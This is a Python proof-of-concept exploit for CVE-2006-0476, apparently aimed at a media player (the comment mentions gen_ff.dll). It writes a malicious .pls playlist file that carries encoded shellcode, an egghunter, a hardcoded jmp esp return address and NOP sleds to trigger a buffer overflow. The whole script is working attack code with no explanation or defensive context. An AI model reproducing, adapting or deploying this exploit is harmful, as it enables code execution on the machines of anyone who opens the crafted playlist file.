#!/usr/bin/python
#
# POC for CVE-2006-0476
#

import struct

header = "[playlist]\r\nFile1=\\\\"
footer = "\r\nTitle1=Pheer playlist\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"

buf = "T00WT00W"
buf += "\x89\xe0\xda\xd9\xd9\x70\xf4\x5f\x57\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x38\x68\x6b"
buf += "\x32\x63\x30\x55\x50\x57\x70\x53\x50\x6f\x79\x4a\x45"
buf += "\x45\x61\x4f\x30\x70\x64\x6c\x4b\x56\x30\x46\x50\x6e"
buf += "\x6b\x66\x32\x46\x6c\x4e\x6b\x33\x62\x76\x74\x6e\x6b"
buf += "\x74\x32\x44\x68\x54\x4f\x68\x37\x72\x6a\x74\x66\x50"
buf += "\x31\x79\x6f\x4c\x6c\x75\x6c\x31\x71\x71\x6c\x46\x62"
buf += "\x64\x6c\x37\x50\x5a\x61\x68\x4f\x36\x6d\x67\x71\x78"
buf += "\x47\x6a\x42\x6b\x42\x70\x52\x76\x37\x4e\x6b\x73\x62"
buf += "\x64\x50\x4e\x6b\x52\x6a\x65\x6c\x4c\x4b\x62\x6c\x62"
buf += "\x31\x30\x78\x59\x73\x73\x78\x47\x71\x7a\x71\x56\x31"
buf += "\x4e\x6b\x52\x79\x51\x30\x43\x31\x5a\x73\x4c\x4b\x53"
buf += "\x79\x75\x48\x5a\x43\x47\x4a\x53\x79\x4e\x6b\x34\x74"
buf += "\x6c\x4b\x66\x61\x58\x56\x30\x31\x49\x6f\x4c\x6c\x4f"
buf += "\x31\x7a\x6f\x56\x6d\x73\x31\x68\x47\x57\x48\x6d\x30"
buf += "\x32\x55\x39\x66\x35\x53\x71\x6d\x48\x78\x35\x6b\x61"
buf += "\x6d\x64\x64\x43\x45\x58\x64\x76\x38\x4c\x4b\x50\x58"
buf += "\x57\x54\x77\x71\x4a\x73\x42\x46\x6e\x6b\x76\x6c\x50"
buf += "\x4b\x6e\x6b\x71\x48\x55\x4c\x55\x51\x7a\x73\x4e\x6b"
buf += "\x57\x74\x4c\x4b\x35\x51\x78\x50\x4e\x69\x70\x44\x35"
buf += "\x74\x47\x54\x71\x4b\x33\x6b\x50\x61\x72\x79\x53\x6a"
buf += "\x52\x71\x6b\x4f\x49\x70\x73\x6f\x71\x4f\x53\x6a\x4e"
buf += "\x6b\x55\x42\x38\x6b\x4e\x6d\x33\x6d\x71\x78\x54\x73"
buf += "\x76\x52\x77\x70\x77\x70\x51\x78\x64\x37\x71\x63\x57"
buf += "\x42\x73\x6f\x63\x64\x33\x58\x62\x6c\x54\x37\x36\x46"
buf += "\x55\x57\x79\x6f\x39\x45\x38\x38\x4a\x30\x46\x61\x33"
buf += "\x30\x65\x50\x45\x79\x79\x54\x33\x64\x42\x70\x50\x68"
buf += "\x46\x49\x6b\x30\x70\x6b\x47\x70\x69\x6f\x79\x45\x30"
buf += "\x6a\x64\x4b\x32\x79\x52\x70\x68\x62\x49\x6d\x62\x4a"
buf += "\x45\x51\x42\x4a\x54\x42\x63\x58\x4b\x5a\x64\x4f\x59"
buf += "\x4f\x6b\x50\x79\x6f\x59\x45\x6a\x37\x30\x68\x53\x32"
buf += "\x73\x30\x76\x71\x73\x6c\x4e\x69\x4a\x46\x31\x7a\x76"
buf += "\x70\x61\x46\x36\x37\x52\x48\x59\x52\x69\x4b\x64\x77"
buf += "\x53\x57\x6b\x4f\x4a\x75\x6d\x55\x39\x50\x70\x75\x71"
buf += "\x48\x72\x77\x55\x38\x6c\x77\x7a\x49\x35\x68\x69\x6f"
buf += "\x6b\x4f\x39\x45\x50\x57\x62\x48\x62\x54\x58\x6c\x67"
buf += "\x4b\x4b\x51\x59\x6f\x7a\x75\x71\x47\x6c\x57\x33\x58"
buf += "\x52\x55\x32\x4e\x52\x6d\x70\x61\x79\x6f\x68\x55\x32"
buf += "\x4a\x77\x70\x63\x5a\x65\x54\x50\x56\x31\x47\x30\x68"
buf += "\x45\x52\x39\x49\x7a\x68\x63\x6f\x39\x6f\x38\x55\x4f"
buf += "\x73\x4b\x48\x77\x70\x51\x6e\x76\x4d\x4c\x4b\x30\x36"
buf += "\x53\x5a\x51\x50\x43\x58\x77\x70\x62\x30\x43\x30\x73"
buf += "\x30\x51\x46\x72\x4a\x63\x30\x35\x38\x46\x38\x4c\x64"
buf += "\x32\x73\x58\x65\x4b\x4f\x58\x55\x6d\x43\x63\x63\x51"
buf += "\x7a\x45\x50\x51\x46\x71\x43\x43\x67\x72\x48\x33\x32"
buf += "\x6a\x79\x58\x48\x33\x6f\x59\x6f\x6e\x35\x4b\x33\x49"
buf += "\x68\x45\x50\x63\x4e\x37\x77\x35\x51\x69\x53\x71\x39"
buf += "\x59\x56\x63\x45\x7a\x49\x4a\x63\x41\x41"
buf += "\x90" * 188

egghunter = "\x90"*8
egghunter += "\xeb\x02\xeb\x05"
egghunter += "\xe8\xf9\xff\xff"
egghunter += "\xff\x59\x83\xc1"
egghunter += "\x04"
egghunter += "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
egghunter += "\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41"
egghunter += "\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
egghunter += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x62"
egghunter += "\x46\x6b\x31\x4a\x6a\x49\x6f\x34\x4f\x73\x72\x53\x62"
egghunter += "\x31\x7a\x67\x72\x71\x48\x78\x4d\x34\x6e\x47\x4c\x63"
egghunter += "\x35\x70\x5a\x61\x64\x5a\x4f\x4e\x58\x71\x44\x30\x30"
egghunter += "\x66\x50\x72\x77\x6c\x49\x68\x57\x6c\x6f\x72\x55\x39"
egghunter += "\x7a\x4e\x4f\x43\x45\x48\x67\x79\x6f\x6d\x37\x41\x41"
egghunter += "\x90"*28

#found jmp esp in gen_ff.dll 1A113749
jmp = struct.pack("I", 0x1A113749)
fstage = ""
fstage += "\x83\xEC\x58"
fstage += "\x83\xEC\x58"
fstage += "\xFF\xE4"
nop = "\x90" * 4

print "[+] Generating playlist file"
pfd = open ('pheer.pls', 'w')
pfd.write(header)
pfd.write(buf)
pfd.write(egghunter)
pfd.write(jmp)
pfd.write(fstage)
pfd.write(nop)
pfd.write(footer)
